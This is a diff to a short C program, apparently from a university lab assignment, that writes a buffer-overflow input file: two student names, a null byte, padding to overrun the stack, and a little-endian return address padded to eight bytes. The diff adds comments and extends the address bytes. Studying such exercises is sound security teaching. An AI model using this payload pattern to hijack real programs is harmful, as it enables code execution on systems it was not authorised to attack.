@@ -11,8 +11,8 @@
 
 #include <stdio.h>
 
-/* Accepts a string of characters as a command-line argument. Writes
-   the string of characters to the dataB file. Returns 0. */
+/* Writes a string of characters, a null byte, another string
+   of characters, and a memory address to the dataB file. Returns 0. */
 int main(void) {
 
    /* create a file pointer and iterator variable */
@@ -22,18 +22,23 @@ int main(void) {
    dataB = fopen("dataB", "w+");
 
    /* write names to file */ 
-   fprintf(dataB, "Alex Delistathis & Matthew Zhang");
+   fprintf(dataB, "Alex Delistathis & Matthew Zhang"); /* 32 characters */
 
    /* write null byte to file */
    putc('\0', dataB);
    
    /* overrun the stack */
-   fprintf(dataB, "%s", "angangangangang");
+   fprintf(dataB, "%s", "angangangangang"); /* 15 characters */
 
    /* write target address to file */
    fprintf(dataB, "%c", 0x90);
    fprintf(dataB, "%c", 0x08);
    fprintf(dataB, "%c", 0x40);
+   fprintf(dataB, "%c", 0x00);
+   fprintf(dataB, "%c", 0x00);
+   fprintf(dataB, "%c", 0x00);
+   fprintf(dataB, "%c", 0x00);
+   fprintf(dataB, "%c", 0x00);
    
    /* close file */
    fclose(dataB);
